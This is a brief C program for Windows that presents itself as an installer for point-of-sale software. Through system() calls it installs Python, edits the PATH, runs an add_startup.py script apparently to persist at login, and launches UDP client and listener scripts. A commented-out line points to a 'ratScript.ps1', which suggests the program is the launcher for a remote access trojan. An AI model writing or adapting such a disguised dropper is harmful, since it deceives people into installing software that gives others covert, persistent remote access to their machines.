#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    printf("Installing now, please install python to run the POS.\n");
    system("start python-3.8.1.exe\n");
    system("setx path \"%PATH%;%homepath%\\appdata\\local\\programs\\python\\python38\"\n");
    system("python add_startup.py");
    system("python ./UDP_Connection/client.py\n");
    system("python ./UDP_Connection/clientlistener.py\n");
    //system("%homepath%\\documents\\ourFolder\\ratScript.ps1");
    return 0;
}